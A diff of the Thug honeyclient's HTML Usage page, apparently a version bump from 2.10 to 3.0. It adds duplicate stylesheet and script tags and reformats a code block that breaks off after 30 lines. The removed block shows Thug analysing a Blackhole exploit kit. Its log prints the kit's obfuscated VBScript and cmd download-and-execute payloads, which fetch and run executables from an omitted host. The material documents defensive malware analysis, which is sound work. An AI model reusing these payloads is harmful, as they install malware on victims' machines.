@@ -7,12 +7,14 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   
-  <title>Usage &mdash; Thug 2.10 documentation</title>
+  <title>Usage &mdash; Thug 3.0 documentation</title>
   
 
   
   <link rel="stylesheet" href="static/css/theme.css" type="text/css" />
   <link rel="stylesheet" href="static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="static/css/theme.css" type="text/css" />
 
   
   
@@ -29,6 +31,7 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="./" src="static/documentation_options.js"></script>
+        <script data-url_root="./" id="documentation_options" src="static/documentation_options.js"></script>
         <script src="static/jquery.js"></script>
         <script src="static/underscore.js"></script>
         <script src="static/doctools.js"></script>
@@ -63,7 +66,7 @@
             
             
               <div class="version">
-                2.10
+                3.0
               </div>
             
           
@@ -310,147 +313,78 @@ Available User-Agents:
 </pre></div>
 </div>
 <p>Let’s start with a first basic real-world example: a Blackhole exploit kit.</p>
-<div class="highlight-sh notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
-<span class="normal"> 2</span>
-<span class="normal"> 3</span>
-<span class="normal"> 4</span>
-<span class="normal"> 5</span>
-<span class="normal"> 6</span>
-<span class="normal"> 7</span>
-<span class="normal"> 8</span>
-<span class="normal"> 9</span>
-<span class="normal">10</span>
-<span class="normal">11</span>
-<span class="normal">12</span>
-<span class="normal">13</span>
-<span class="normal">14</span>
-<span class="normal">15</span>
-<span class="normal">16</span>
-<span class="normal">17</span>
-<span class="normal">18</span>
-<span class="normal">19</span>
-<span class="normal">20</span>
-<span class="normal">21</span>
-<span class="normal">22</span>
-<span class="normal">23</span>
-<span class="normal">24</span>
-<span class="normal">25</span>
-<span class="normal">26</span>
-<span class="normal">27</span>
-<span class="normal">28</span>
-<span class="normal">29</span>
-<span class="normal">30</span>
-<span class="normal">31</span>
-<span class="normal">32</span>
-<span class="normal">33</span>
-<span class="normal">34</span>
-<span class="normal">35</span>
-<span class="normal">36</span>
-<span class="normal">37</span>
-<span class="normal">38</span>
-<span class="normal">39</span>
-<span class="normal">40</span>
-<span class="normal">41</span>
-<span class="normal">42</span>
-<span class="normal">43</span>
-<span class="normal">44</span>
-<span class="normal">45</span>
-<span class="normal">46</span>
-<span class="normal">47</span>
-<span class="normal">48</span>
-<span class="normal">49</span>
-<span class="normal">50</span>
-<span class="normal">51</span>
-<span class="normal">52</span>
-<span class="normal">53</span>
-<span class="normal">54</span>
-<span class="normal">55</span>
-<span class="normal">56</span>
-<span class="normal">57</span>
-<span class="normal">58</span>
-<span class="normal">59</span>
-<span class="normal">60</span>
-<span class="normal">61</span>
-<span class="normal">62</span>
-<span class="normal">63</span>
-<span class="normal">64</span>
-<span class="normal">65</span>
-<span class="normal">66</span>
-<span class="normal">67</span>
-<span class="normal">68</span>
-<span class="normal">69</span>
-<span class="normal">70</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span>       ~ $ thug <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:22<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:23<span class="o">]</span> Saving applet Ryp.jar
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: acropdf.pdf
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>adodb.stream<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: adodb.stream
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>Shell.Application<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: shell.application
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Fetching from URL http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:27<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Saving File: d328b5a123bce1c0d20d763ad745303a
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> send
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> open
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Write
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> SaveToFile <span class="o">(</span>.//..//a2ffcd1.exe<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Close
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Shell.Application ActiveX<span class="o">]</span> ShellExecute command: .//..//a2ffcd1.exe
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap1.php?f<span class="o">=</span>b081d --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; <span class="m">64</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
-       cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
-
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Code:
-       cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
-       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">2</span><span class="o">]</span> Code:
-       <span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
-       Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
-       On Error resume next
-       c.open OT, a, z:c.send<span class="o">()</span>
-       If c.Status <span class="o">=</span> x Then
-       d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
-       End If
-       Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
-       Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
-       W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>
-
-<span class="s2">       [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
-<span class="s2">       [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
-<span class="s2">       [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
-<span class="s2">       [2012-07-02 19:15:45] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
-<span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
-<span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
-<span class="s2">       [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
-<span class="s2">       [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
-<span class="s2">       [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
-<span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
-<span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
-<span class="s2">       [2012-07-02 19:15:52] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
-<span class="s2">       [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
-<span class="s2">       [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
-<span class="s2">       [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
-<span class="s2">       [2012-07-02 19:15:53] Saving log analysis at /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="linenos"> 1</span>       ~ $ thug <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
+<span class="linenos"> 2</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
+<span class="linenos"> 3</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
+<span class="linenos"> 4</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
+<span class="linenos"> 5</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:22<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
+<span class="linenos"> 6</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:23<span class="o">]</span> Saving applet Ryp.jar
+<span class="linenos"> 7</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
+<span class="linenos"> 8</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: acropdf.pdf
+<span class="linenos"> 9</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
+<span class="linenos">10</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
+<span class="linenos">11</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
+<span class="linenos">12</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
+<span class="linenos">13</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
+<span class="linenos">14</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
+<span class="linenos">15</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>adodb.stream<span class="o">)</span>
+<span class="linenos">16</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: adodb.stream
+<span class="linenos">17</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>Shell.Application<span class="o">)</span>
+<span class="linenos">18</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: shell.application
+<span class="linenos">19</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
+<span class="linenos">20</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
+<span class="linenos">21</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Fetching from URL http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span>
+<span class="linenos">22</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:27<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
+<span class="linenos">23</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Saving File: d328b5a123bce1c0d20d763ad745303a
+<span class="linenos">24</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> send
+<span class="linenos">25</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> open
+<span class="linenos">26</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Write
+<span class="linenos">27</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> SaveToFile <span class="o">(</span>.//..//a2ffcd1.exe<span class="o">)</span>
+<span class="linenos">28</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Close
+<span class="linenos">29</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Shell.Application ActiveX<span class="o">]</span> ShellExecute command: .//..//a2ffcd1.exe
+<span class="linenos">30</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap1.php?f<span class="o">=</span>b081d --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
